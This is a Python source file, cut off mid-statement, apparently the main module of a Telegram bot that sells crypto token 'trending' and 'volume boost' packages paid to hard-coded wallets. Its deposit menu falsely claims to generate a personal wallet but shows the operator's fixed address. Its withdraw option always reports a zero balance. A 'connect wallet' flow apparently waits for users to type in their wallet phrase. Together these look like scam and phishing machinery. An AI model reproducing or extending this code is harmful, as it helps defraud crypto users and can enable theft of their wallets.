# from telebot import TeleBot
# from telebot.types import InlineKeyboardButton
import sys
from bot_instance import bot
from startbump import handle_startbumps_callbacks, handle_start_bump
from user_sessions import set_user_ca, get_user_price, get_user_ca
import requests
from menu import start_message
from bot_interations import send_payment_verification_to_group, handle_group_callback, group_chat_id
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# Import group reply functionality
from bot_interations import admin_reply_state
from volume import handle_volume, handle_volume_package, volume_temp_ca_info
from premuim import handle_premium, handle_sol_trending, handle_sol_trending_callbacks, handle_eth_trending, handle_eth_trending_callbacks, handle_pumpfun_trending, handle_pumpfun_trending_callbacks
from deposit import handle_deposit
from connect import handle_connect, handle_connect_wallet, handle_connect_security, connect_phrase_waiting
from dexscreener import handle_dexscreener, handle_dexscreener_trend, banner_waiting
from wallets import SOL_WALLET, ETH_WALLET_100, ETH_WALLET_200, ETH_WALLET_300, PUMPFUN_WALLET, DEFAULT_WALLET
from ca_input_handler import handle_ca_input, handle_ca_callback, is_user_waiting_for_ca, send_ca_prompt
from bot_lock import BotLock
from sponsorship import handle_sponsorship, handle_sponsorship_duration, handle_sponsorship_date, handle_sponsorship_back, handle_contract_address, handle_telegram_address, handle_design_media, is_user_in_sponsorship_flow, handle_sponsorship_confirm_project, handle_sponsorship_confirm_contract, handle_sponsorship_confirm_token_details, handle_sponsorship_confirm_telegram, handle_sponsorship_retry_contract, handle_sponsorship_retry_telegram, handle_sponsorship_retry_design
from exclusive_ads import handle_exclusive_ads, handle_exclusive_ultimate, handle_exclusive_voting, handle_exclusive_massdm, handle_exclusive_buttonads, handle_exclusive_majorama, handle_exclusive_back
# import telebot
# print(telebot.__version__)
import re
import time
import threading


prices = {}

# Enhanced tx_hash_waiting structure to store more data
tx_hash_waiting = {}

temp_ca_info = {}

def mdv2_escape(text):
    # Simple escape for Markdown - only escape backticks
    return text.replace('`', '\\`')

def is_valid_tx_hash(tx_hash):
    # ETH: 0x + 64 hex chars
    if tx_hash.startswith('0x') and len(tx_hash) == 66 and all(c in '0123456789abcdefABCDEF' for c in tx_hash[2:]):
        return True
    # SOL: 43-88 base58 chars (letters/numbers, no 0x)
    if 43 <= len(tx_hash) <= 88 and tx_hash.isalnum() and not tx_hash.startswith('0x'):
        return True
    return False

def send_tx_hash_prompt(chat_id, price):
    """Send tx hash input prompt with cancel button"""
    text = f"You selected this {price}\n\nPlease send your tx hash below and await immediate confirmation\n\n⏰ You have 15 minutes to submit your transaction hash."
    
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("❌ Cancel", callback_data="tx_cancel"),
        InlineKeyboardButton("🔄 Retry", callback_data="tx_retry")
    )
    
    bot.send_message(chat_id, text, reply_markup=markup)
    
    # Store waiting state with timestamp
    tx_hash_waiting[chat_id] = {
        'timestamp': time.time(),
        'price': price,
        'ca': get_user_ca(chat_id)
    }
    
    # Start timeout thread
    start_tx_timeout(chat_id)

def start_tx_timeout(chat_id):
    """Start a timeout thread for tx hash submission"""
    def timeout_check():
        time.sleep(900)  # 15 minutes = 900 seconds
        if chat_id in tx_hash_waiting:
            # Check if still waiting after timeout
            waiting_data = tx_hash_waiting[chat_id]
            if time.time() - waiting_data['timestamp'] >= 900:
                # Timeout occurred
                tx_hash_waiting.pop(chat_id, None)
                markup = InlineKeyboardMarkup(row_width=1)
                markup.add(InlineKeyboardButton("🔝 Main Menu", callback_data="mainmenu"))
                bot.send_message(chat_id, "⏰ Timeout: You didn't submit a transaction hash within 15 minutes. Your order has been cancelled.", reply_markup=markup)
    
    thread = threading.Thread(target=timeout_check)
    thread.daemon = True
    thread.start()

def handle_tx_callback(call):
    """Handle tx hash related callbacks (cancel, retry)"""
    chat_id = call.message.chat.id
    data = call.data
    
    if data == "tx_cancel":
        # Cancel tx hash submission
        tx_hash_waiting.pop(chat_id, None)
        
        # Send user back to main menu
        try:
            bot.delete_message(chat_id, call.message.message_id)
        except:
            pass
        start_message(call.message)
        
    elif data == "tx_retry":
        # Retry tx hash submission
        if chat_id in tx_hash_waiting:
            price = tx_hash_waiting[chat_id]['price']
            # Update timestamp for new attempt
            tx_hash_waiting[chat_id]['timestamp'] = time.time()
            
            # Send new prompt
            send_tx_hash_prompt(chat_id, price)
            
            try:
                bot.delete_message(chat_id, call.message.message_id)
            except:
                pass
        else:
            bot.answer_callback_query(call.id, "❌ No active transaction waiting. Please start a new order.")

def send_eth_payment_instructions(chat_id, price, token_name=None):
    """Send ETH trending payment instructions with multiple wallet options"""
    verify_text = "\n\nClick /sent to verify payment"
    
    # Define wallet addresses for different price tiers
    eth_wallets = {
        "100$": ETH_WALLET_100,
        "200$": ETH_WALLET_200,
        "300$": ETH_WALLET_300
    }
    
    wallet_address = eth_wallets.get(price, ETH_WALLET_100)
    text = (
        f"🔵ETH TREND\n"
        f"Kindly chose the trend you wish to pump on.\n\n"
        f"✅Token Successfully added✅\n\n"
        f"🟢One last Step: Payment Required.\n\n"
        f"Price: {price}\n"
        f"Wallet:\n\n"
        f"<code>{wallet_address}</code>\n\n"
        f"📝 Note:\n"
        f"Kindly make sure to send the exact price and no additional price should be add.{verify_text}"
    )
    bot.send_message(chat_id, text, parse_mode="HTML")

def send_pumpfun_payment_instructions(chat_id, price, token_name=None):
    """Send PumpFun trending payment instructions"""
    verify_text = "\n\nClick /sent to verify payment"
    
    pumpfun_address = PUMPFUN_WALLET
    text = (
        f"Order Placed Successfully!\n"
        f"✅ We have 1 available slot!✅\n\n"
        f"Once the payment received you will get notification and trending will start in 20 mins.\n\n\n"
        f"Payment address:SOL\n"
        f"<code>{pumpfun_address}</code>\n"
        f" (Tap to Copy){verify_text}"
    )
    bot.send_message(chat_id, text, parse_mode="HTML")

def send_volume_payment_instructions(chat_id, price, token_name=None):
    """Send volume boost payment instructions"""
    verify_text = "\n\nClick /sent to verify payment"
    
    # Get package details based on price
    package_details = {
        '1.50': {'name': 'Iron Package', 'volume': '$40,200'},
        '2.50': {'name': 'Bronze Package', 'volume': '$92,000'},
        '3.50': {'name': 'Gold Package', 'volume': '$932,000'},
        '5.00': {'name': 'Platinum Package', 'volume': '$1,400,000'},
        '7.50': {'name': 'Silver Package', 'volume': '$466,000'},
        '10.50': {'name': 'Diamond Package', 'volume': '$2,400,000'}
    }
    
    package = package_details.get(price, {'name': 'Volume Boost Package', 'volume': 'Custom'})
    
    wallet_address = SOL_WALLET
    
    text = (
        f"🚀 <b>Volume Boost Order Confirmed!</b>\n\n"
        f"✅ <b>{package['name']}</b> Successfully Added ✅\n\n"
        f"📊 <b>Package Details:</b>\n"
        f"• Package: {package['name']}\n"
        f"• Volume: {package['volume']}\n"
        f"• Price: {price} SOL\n\n"
        f"🟢 <b>One Last Step: Payment Required</b>\n\n"
        f"⌛️ Please complete the one-time fee payment of <b>{price} SOL</b> to the following wallet address:\n\n"
        f"<b>Wallet:</b>\n"
        f"<code>{wallet_address}</code>\n\n"
        f"Once you have completed the payment within the given timeframe, your volume boost will be activated!{verify_text}"
    )
    
    bot.send_message(chat_id, text, parse_mode="HTML")

def send_eth_trending_payment_instructions(chat_id, price, token_name=None):
    """Send ETH trending payment instructions"""
    verify_text = "\n\nClick /sent to verify payment"
    
    # Get package details based on price
    package_details = {
        '100$': {'name': 'ETH Trending Basic', 'duration': '24 hours'},
        '200$': {'name': 'ETH Trending Standard', 'duration': '48 hours'},
        '300$': {'name': 'ETH Trending Premium', 'duration': '72 hours'}
    }
    
    package = package_details.get(price, {'name': 'ETH Trending Package', 'duration': 'Custom'})
    
    # Define wallet addresses for different price tiers
    eth_wallets = {
        "100$": ETH_WALLET_100,
        "200$": ETH_WALLET_200,
        "300$": ETH_WALLET_300
    }
    
    # Get the appropriate wallet address for the price
    wallet_address = eth_wallets.get(price, ETH_WALLET_100)
    
    text = (
        f"🔵 <b>ETH Trending Order Confirmed!</b>\n\n"
        f"✅ <b>{package['name']}</b> Successfully Added ✅\n\n"
        f"📊 <b>Package Details:</b>\n"
        f"• Package: {package['name']}\n"
        f"• Duration: {package['duration']}\n"
        f"• Price: {price}\n\n"
        f"🟢 <b>One Last Step: Payment Required</b>\n\n"
        f"⌛️ Please complete the one-time fee payment of <b>{price}</b> to the following wallet address:\n\n"
        f"<b>Wallet:</b>\n"
        f"<code>{wallet_address}</code>\n\n"
        f"Once you have completed the payment within the given timeframe, your ETH trending will be activated!{verify_text}"
    )
    
    bot.send_message(chat_id, text, parse_mode="HTML")

def send_payment_instructions(chat_id, price, token_name=None):
    # Check if this is a volume boost payment
    if price in ['1.50', '2.50', '3.50', '5.00', '7.00', '10.50']:
        send_volume_payment_instructions(chat_id, price, token_name)
        return
    
    # Check if this is an ETH trending payment
    if price and "$" in price:
        send_eth_trending_payment_instructions(chat_id, price, token_name)
        return
    
    # Check if this is a PumpFun trending payment
    if price and price == "30 SOL":
        send_pumpfun_payment_instructions(chat_id, price, token_name)
        return
    
    wallet_address = SOL_WALLET
    verify_text = "\n\nClick /sent to verify payment"
    if token_name:
        text = f"✅{token_name} Successfully added✅\n\n🟢One last Step: Payment Required\n\n⌛️ Please complete the one time fee payment of {price} to the following wallet address: \n\nWallet:\n<code>{wallet_address}</code>\n\nOnce you have completed the payment within the given timeframe, your bump order will be activated !{verify_text}"
    else:
        text = f"✅Token Successfully added✅\n\n🟢One last Step: Payment Required\n\n⌛️ Please complete the one time fee payment of {price} SOL to the following wallet address: \n\nWallet:\n<code>{wallet_address}</code>\n\nOnce you have completed the payment within the given timeframe, your bump order will be activated !{verify_text}"
    price_to_image = {
        '0.3': 'https://github.com/raccityy/raccityy.github.io/blob/main/3.jpg?raw=true',
        '0.4': 'https://github.com/raccityy/raccityy.github.io/blob/main/4.jpg?raw=true',
        '0.5': 'https://github.com/raccityy/raccityy.github.io/blob/main/5.jpg?raw=true',
        '0.6': 'https://github.com/raccityy/raccityy.github.io/blob/main/6.jpg?raw=true',
    }
    # Extract numeric part from price (handle both "0.3" and "2 SOL" formats)
    if ' ' in price:  # Price contains "SOL" (e.g., "2 SOL")
        numeric_price = price.split(' ')[0]  # Extract "2" from "2 SOL"
    else:
        numeric_price = price  # Already numeric (e.g., "0.3")
    
    # Format price to one decimal place string for lookup
    price_str = f"{float(numeric_price):.1f}"
    image_url = price_to_image.get(price_str, None)
    if image_url and image_url.startswith('http'):
        try:
            bot.send_photo(chat_id, image_url, caption=text, parse_mode="HTML")
        except Exception:
            bot.send_message(chat_id, text, parse_mode="HTML")
    else:
        bot.send_message(chat_id, text, parse_mode="HTML")

# Group message handler - must be first to have priority
# This handler processes ALL message types from the group chat
@bot.message_handler(content_types=['text', 'photo', 'video', 'document', 'sticker', 'animation', 'voice', 'video_note', 'dice', 'poll'], func=lambda message: message.chat.id == group_chat_id)
def handle_group_admin_reply(message):
    print(f"DEBUG: Group message received from {message.from_user.id}, chat_id: {message.chat.id}")
    admin_id = message.from_user.id
    print(f"DEBUG: Admin {admin_id} in reply state: {admin_id in admin_reply_state}")
    
    if admin_id in admin_reply_state:
        user_chat_id = admin_reply_state[admin_id]
        
        # Handle cancel command
        if message.text and message.text.lower() in ['/cancel', '/exit', '/stop']:
            admin_reply_state.pop(admin_id, None)
            bot.send_message(message.chat.id, "❌ Reply mode cancelled.")
            return
        
        # Handle different types of messages
        try:
            print(f"DEBUG: Message type - text: {bool(message.text)}, photo: {bool(message.photo)}, sticker: {bool(message.sticker)}, video: {bool(message.video)}, document: {bool(message.document)}")
            
            if message.text:
                # Text message (including emojis)
                bot.send_message(user_chat_id, f"{message.text}")
                bot.send_message(message.chat.id, "✅ Text reply sent to user.")
            elif message.photo:
                # Image message
                print(f"DEBUG: Sending photo with file_id: {message.photo[-1].file_id}")
                bot.send_photo(user_chat_id, message.photo[-1].file_id, caption=message.caption)
                bot.send_message(message.chat.id, "✅ Image reply sent to user.")
            elif message.sticker:
                # Sticker message
                print(f"DEBUG: Sending sticker with file_id: {message.sticker.file_id}")
                bot.send_sticker(user_chat_id, message.sticker.file_id)
                bot.send_message(message.chat.id, "✅ Sticker reply sent to user.")
            elif message.animation:
                # GIF/Animation message
                print(f"DEBUG: Sending animation with file_id: {message.animation.file_id}")
                bot.send_animation(user_chat_id, message.animation.file_id, caption=message.caption)
                bot.send_message(message.chat.id, "✅ Animation reply sent to user.")
            elif message.video:
                # Video message
                print(f"DEBUG: Sending video with file_id: {message.video.file_id}")
                bot.send_video(user_chat_id, message.video.file_id, caption=message.caption)
                bot.send_message(message.chat.id, "✅ Video reply sent to user.")
            elif message.document:
                # Document message
                print(f"DEBUG: Sending document with file_id: {message.document.file_id}")
                bot.send_document(user_chat_id, message.document.file_id, caption=message.caption)
                bot.send_message(message.chat.id, "✅ Document reply sent to user.")
            elif message.voice:
                # Voice message
                bot.send_voice(user_chat_id, message.voice.file_id)
                bot.send_message(message.chat.id, "✅ Voice reply sent to user.")
            elif message.video_note:
                # Video note (round video)
                bot.send_video_note(user_chat_id, message.video_note.file_id)
                bot.send_message(message.chat.id, "✅ Video note reply sent to user.")
            elif message.dice:
                # Dice message
                bot.send_dice(user_chat_id, emoji=message.dice.emoji)
                bot.send_message(message.chat.id, "✅ Dice reply sent to user.")
            elif message.poll:
                # Poll message
                bot.send_poll(user_chat_id, question=message.poll.question, options=[option.text for option in message.poll.options])
                bot.send_message(message.chat.id, "✅ Poll reply sent to user.")
            else:
                # Fallback for other message types
                print(f"DEBUG: Unsupported message type - content_type: {message.content_type}")
                bot.send_message(user_chat_id, "Admin sent a message (unsupported format)")
                bot.send_message(message.chat.id, "⚠️ Unsupported message type sent to user.")
            
            # Keep admin in reply mode for multiple messages
            
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error sending reply: {str(e)}")
            admin_reply_state.pop(admin_id, None)
    else:
        print(f"DEBUG: Admin {admin_id} not in reply state, ignoring message")

@bot.message_handler(commands=["start"], func=lambda message: message.chat.id != group_chat_id)
def handle_start(message):
    start_message(message)
    # Notify group
    user = message.from_user.username or message.from_user.id
    bot.send_message(group_chat_id, f"User @{user} just clicked /start")


@bot.callback_query_handler(func=lambda call: True)
def handle_callbacks(call):
    # print(call.data)
    bot.send_message(group_chat_id, f"User @{call.from_user.username} just clicked {call.data}")

    # Handle group reply/close buttons
    if call.data.startswith("group_reply_") or call.data.startswith("group_close_"):
        handle_group_callback(call)
        return

    # Handle CA-related callbacks (cancel, retry)
    if call.data.startswith("ca_cancel_") or call.data.startswith("ca_retry_"):
        handle_ca_callback(call)
        return

    # Handle tx hash related callbacks (cancel, retry)
    if call.data.startswith("tx_"):
        handle_tx_callback(call)
        return

    # Standardized back and menu button handling
    if call.data == "back":
        # Back button should go back one step - this will be handled by specific handlers
        return
    elif call.data == "mainmenu":
        # Menu button should always go to main menu
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "volume":
        handle_volume(call)
        return

    # Handle volume package buttons
    if call.data in [
        "vol_iron", "vol_bronze", "vol_gold", "vol_platinum", "vol_silver", "vol_diamond"
    ]:
        handle_volume_package(call)
        return

    if call.data == "vol_back":
        # Go back to main menu (one step back from volume)
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return
    elif call.data == "vol_mainmenu":
        # Go to main menu
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    if call.data == "vol_ca_confirm":
        chat_id = call.message.chat.id
        info = volume_temp_ca_info.pop(chat_id, None)
        if info:
            price = info['price']
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_volume_payment_instructions(chat_id, price)
        return

    if call.data == "vol_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "volume")
        return

    if call.data == "eth_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_eth_trending_payment_instructions(chat_id, price)
        return

    if call.data == "eth_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "eth_trending")
        return

    if call.data == "sol_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        return

    if call.data == "sol_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "sol_trending")
        return

    if call.data == "pumpfun_ca_confirm":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        return

    if call.data == "pumpfun_back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "pumpfun_trending")
        return

    if call.data == "premium":
        handle_premium(call)
        return

    # Handle premium buttons
    if call.data.startswith("premium_"):
        if call.data == "premium_sol":
            handle_sol_trending(call)
        elif call.data == "premium_eth":
            handle_eth_trending(call)
        elif call.data == "premium_pumpfun":
            handle_pumpfun_trending(call)
        elif call.data == "premium_back":
            # Go back to main menu (one step back from premium)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "premium_menu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            handle_premium(call)
        return

    # Handle SOL trending buttons
    if call.data.startswith("sol_"):
        if call.data == "sol_back":
            # Go back to premium menu (one step back from SOL trending)
            handle_premium(call)
        elif call.data == "sol_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle SOL trending package selection
            handle_sol_trending_callbacks(call)
        return

    # Handle ETH trending buttons
    if call.data.startswith("eth_"):
        if call.data == "eth_back":
            # Go back to premium menu (one step back from ETH trending)
            handle_premium(call)
        elif call.data == "eth_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle ETH trending package selection
            handle_eth_trending_callbacks(call)
        return

    # Handle PumpFun trending buttons
    if call.data.startswith("pumpfun_"):
        if call.data == "pumpfun_back":
            # Go back to premium menu (one step back from PumpFun trending)
            handle_premium(call)
        elif call.data == "pumpfun_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        else:
            # Handle PumpFun trending package selection
            handle_pumpfun_trending_callbacks(call)
        return

    if call.data == "startbump":
        handle_start_bump(call)

    elif call.data.startswith("bump_"):
        # Forward bump-related callbacks to startbump handler
        handle_startbumps_callbacks(call)

    elif call.data == "deposit":
        handle_deposit(call)

    # Handle deposit buttons
    if call.data.startswith("deposit_"):
        if call.data == "deposit_add":
            bot.answer_callback_query(call.id)
            deposit_address = SOL_WALLET
            text = (
                "💳 Wallet Generated Successfully\n\n"
                "Make a minimum deposit of 0.20 SOL to the address below:\n\n"
                "📍 Wallet Address:\n"
                f"<code>{deposit_address}</code>\n\n"
                "⏰ Your deposit will be processed automatically"
            )
            bot.send_message(call.message.chat.id, text, parse_mode="HTML")
        elif call.data == "deposit_withdraw":
            bot.answer_callback_query(call.id)
            text = (
                "⚠️ Insufficient Wallet Balance\n\n"
                "Your current balance: 0.0 SOL\n\n"
                "Please deposit at least 0.20 SOL to your wallet\n"
                "Let's get your project trending to the top!"
            )
            bot.send_message(call.message.chat.id, text)
        elif call.data == "deposit_balance":
            bot.answer_callback_query(call.id)
            eth_address = ETH_WALLET_100
            sol_address = SOL_WALLET
            text = (
                "📊 Wallet Balance Overview\n\n"
                "💎 ETH Wallet:\n"
                f"<code>{eth_address}</code>\n"
                "Balance: 0.0 ETH\n\n"
                "☀️ SOL Wallet:\n"
                f"<code>{sol_address}</code>\n"
                "Balance: 0.0 SOL\n\n"
                "💡 Deposit at least 0.20 SOL to start trending on multiple platforms"
            )
            bot.send_message(call.message.chat.id, text, parse_mode="HTML")
        elif call.data == "deposit_back":
            # Go back to main menu (one step back from deposit)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "deposit_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    # Handle dexscreener buttons
    if call.data.startswith("dexscreener_"):
        if call.data == "dexscreener_trend":
            handle_dexscreener_trend(call)
        elif call.data == "dexscreener_back":
            # Go back to main menu (one step back from dexscreener)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "dexscreener_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    elif call.data == "connect":
        handle_connect(call)

    # Handle connect buttons
    if call.data.startswith("connect_"):
        if call.data == "connect_wallet":
            handle_connect_wallet(call)
        elif call.data == "connect_security":
            handle_connect_security(call)
        elif call.data == "connect_back":
            # Go back to main menu (one step back from connect)
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        elif call.data == "connect_mainmenu":
            # Go to main menu
            bot.delete_message(call.message.chat.id, call.message.message_id)
            start_message(call.message)
        return

    elif call.data == "dexscreener":
        handle_dexscreener(call)

    # Handle sponsorship buttons
    if call.data == "sponsorship":
        handle_sponsorship(call)
        return
    
    if call.data.startswith("sponsor_"):
        if call.data in ["sponsor_1day", "sponsor_3days", "sponsor_7days"]:
            handle_sponsorship_duration(call)
        elif call.data.startswith("sponsor_date_"):
            handle_sponsorship_date(call)
        elif call.data == "sponsor_confirm_project":
            handle_sponsorship_confirm_project(call)
        elif call.data == "sponsor_confirm_contract":
            handle_sponsorship_confirm_contract(call)
        elif call.data == "sponsor_confirm_telegram":
            handle_sponsorship_confirm_telegram(call)
        elif call.data == "sponsor_retry_contract":
            handle_sponsorship_retry_contract(call)
        elif call.data == "sponsor_retry_telegram":
            handle_sponsorship_retry_telegram(call)
        elif call.data == "sponsor_retry_design":
            handle_sponsorship_retry_design(call)
        elif call.data == "sponsor_back":
            handle_sponsorship_back(call)
        return

    # Handle exclusive ads buttons
    if call.data == "exclusive_ads":
        handle_exclusive_ads(call)
        return
    
    if call.data.startswith("exclusive_"):
        if call.data == "exclusive_ultimate":
            handle_exclusive_ultimate(call)
        elif call.data == "exclusive_voting":
            handle_exclusive_voting(call)
        elif call.data == "exclusive_massdm":
            handle_exclusive_massdm(call)
        elif call.data == "exclusive_buttonads":
            handle_exclusive_buttonads(call)
        elif call.data == "exclusive_majorama":
            handle_exclusive_majorama(call)
        elif call.data == "exclusive_back":
            handle_exclusive_back(call)
        return

    elif call.data == "ca_confirm":
        chat_id = call.message.chat.id
        info = temp_ca_info.pop(chat_id, None)
        if info:
            price = info['price']
            # Send success message and delete confirmation message
            bot.answer_callback_query(call.id, "✅ CA confirmed successfully!")
            bot.delete_message(chat_id, call.message.message_id)
            send_payment_instructions(chat_id, price)
        else:
            bot.answer_callback_query(call.id, "❌ No CA info found. Please try again.")
        return

    elif call.data == "back_ca":
        chat_id = call.message.chat.id
        price = get_user_price(chat_id)
        if price:
            bot.answer_callback_query(call.id, "🔄 Going back to CA input...")
            bot.delete_message(chat_id, call.message.message_id)
            send_ca_prompt(chat_id, price, "general")
        return

    # Handle connect wallet retry/menu buttons
    elif call.data == "try_connect_again":
        connect_phrase_waiting[call.message.chat.id] = True
        bot.delete_message(call.message.chat.id, call.message.message_id)
        handle_connect_wallet(call)
        # print("yes")
        return
    # Handle connect wallet menu button
    elif call.data == "menu_for_connect":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        start_message(call.message)
        return

    # Handle regular transaction callbacks
    elif call.data in ["tx_cancel", "tx_retry"]:
        handle_tx_callback(call)
        return

    # Handle sponsorship transaction callbacks
    elif call.data == "sponsor_tx_cancel":
        chat_id = call.message.chat.id
        from sponsorship import sponsorship_data
        if chat_id in sponsorship_data:
            sponsorship_data.pop(chat_id, None)
        bot.answer_callback_query(call.id, "❌ Transaction cancelled.")
        bot.delete_message(chat_id, call.message.message_id)
        return
    
    elif call.data == "sponsor_tx_retry":
        chat_id = call.message.chat.id
        from sponsorship import sponsorship_data, send_sponsorship_tx_hash_prompt
        if chat_id in sponsorship_data:
            sol_amount = f"{sponsorship_data[chat_id]['price'] / 50:.3f}"
            bot.delete_message(chat_id, call.message.message_id)
            send_sponsorship_tx_hash_prompt(chat_id, sol_amount)
        else:
            bot.answer_callback_query(call.id, "❌ No sponsorship data found.")
        return

    # else:
    #     bot.answer_callback_query(call.id)
    #     bot.send_message(call.message.chat.id, "❌ Unknown action.")


@bot.message_handler(commands=["sent"], func=lambda message: message.chat.id != group_chat_id)
def handle_sent(message):
    chat_id = message.chat.id
    
    # Check if user is in sponsorship flow
    if is_user_in_sponsorship_flow(chat_id):
        from sponsorship import send_sponsorship_tx_hash_prompt, sponsorship_data
        if chat_id in sponsorship_data and sponsorship_data[chat_id].get('state') == 'payment_pending':
            sol_amount = f"{sponsorship_data[chat_id]['price'] / 50:.3f}"
            send_sponsorship_tx_hash_prompt(chat_id, sol_amount)
        else:
            bot.send_message(chat_id, "No sponsorship payment pending. Please start a new sponsorship order first.")
        return
    
    # Handle regular bump orders
    price = get_user_price(chat_id)
    if price:
        send_tx_hash_prompt(chat_id, price)
    else:
        bot.send_message(chat_id, "No bump order in progress. Please start a new bump order first.")


@bot.message_handler(func=lambda message: message.text and not message.text.startswith('/') and message.chat.id != group_chat_id)
def handle_contract_address_or_tx(message):
    chat_id = message.chat.id
    print(f"DEBUG: Text handler called for chat_id: {chat_id}")
    

    
    if chat_id in tx_hash_waiting:
        tx_hash = message.text.strip()
        if is_valid_tx_hash(tx_hash):
            waiting_data = tx_hash_waiting[chat_id]
            price = waiting_data['price']
            ca = waiting_data['ca']
            user = message.from_user.username or message.from_user.id
            send_payment_verification_to_group(user, price, ca, tx_hash, user_chat_id=chat_id)
            bot.send_message(chat_id, "✅ Your tx hash has been sent for verification. Please wait for confirmation.")
            tx_hash_waiting.pop(chat_id, None)
        else:
            # Invalid tx hash - show retry options
            markup = InlineKeyboardMarkup(row_width=2)
            markup.add(
                InlineKeyboardButton("🔄 Retry", callback_data="tx_retry"),
                InlineKeyboardButton("❌ Cancel", callback_data="tx_cancel")
            )
            bot.send_message(chat_id, "❌ Invalid tx hash. Please send a valid Ethereum or Solana transaction hash.", reply_markup=markup)
        return

    # Handle sponsorship flow
    if is_user_in_sponsorship_flow(chat_id):
        # Check if user is waiting for transaction hash in sponsorship
        from sponsorship import sponsorship_data, send_sponsorship_verification_to_group
        if chat_id in sponsorship_data and sponsorship_data[chat_id].get('state') == 'waiting_tx_hash':
            tx_hash = message.text.strip()
            if is_valid_tx_hash(tx_hash):
                # Process sponsorship transaction hash
                data = sponsorship_data[chat_id]
                user = message.from_user.username or message.from_user.id
                send_sponsorship_verification_to_group(user, data, tx_hash, user_chat_id=chat_id)
                bot.send_message(chat_id, "✅ Your transaction hash has been sent for verification. Please wait for confirmation.")
                sponsorship_data.pop(chat_id, None)  # Clear sponsorship data
            else:
                # Invalid tx hash - show retry options
                markup = InlineKeyboardMarkup(row_width=2)
                markup.add(
                    InlineKeyboardButton("🔄 Retry", callback_data="sponsor_tx_retry"),
                    InlineKeyboardButton("❌ Cancel", callback_data="sponsor_tx_cancel")
                )
                bot.send_message(chat_id, "❌ Invalid transaction hash. Please send a valid Ethereum or Solana transaction hash.", reply_markup=markup)
            return
        
        # Handle other sponsorship inputs
        if handle_contract_address(message) or handle_telegram_address(message) or handle_design_media(message):
            return

    # Handle CA input with new handler
    if is_user_waiting_for_ca(chat_id):
        # Determine which temp_ca_info to use based on the source
        from ca_input_handler import ca_waiting_users
        if chat_id in ca_waiting_users:
            source = ca_waiting_users[chat_id]['source']
            if source == "volume":
                ca_info_dict = volume_temp_ca_info
            else:
                ca_info_dict = temp_ca_info
        else:
            ca_info_dict = temp_ca_info
            
        if handle_ca_input(message, send_payment_instructions, ca_info_dict):
            return

    # All CA input is now handled by the new CA input handler above
    # No additional CA handling needed here

    # Handle banner image input for dexscreener
    if banner_waiting.get(chat_id):
        if message.photo:
            # Valid image received, trigger premium_sol function
            banner_waiting.pop(chat_id, None)
            # Call SOL trending directly
            chat_id = message.chat.id
            text = (
                "🟢Discover the Power of Trending!\n\n"
                "Ready to boost your project's visibility? Trending offers guaranteed exposure, increased attention through milestone and uptrend alerts, and much more!\n\n"
                "🟢A paid boost guarantees you a spot in our daily livestream (AMA)!\n\n"
                "➔ Please choose SOL Trending or Pump Fun Trending to start:\n"
                "_____________________"
            )
            markup = InlineKeyboardMarkup(row_width=2)
            # Top header
            markup.add(InlineKeyboardButton("🔻 TOP 6 🔻", callback_data="none"))
            # First row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 5 hours | 2 SOL", callback_data="sol_5h_2sol"),
                InlineKeyboardButton("⏳ 7 hours | 3.5 SOL", callback_data="sol_7h_3.5sol")
            )
            # Second row: 2 buttons
            markup.add(
                InlineKeyboardButton("⏳ 12 hours | 7 SOL", callback_data="sol_12h_7sol"),
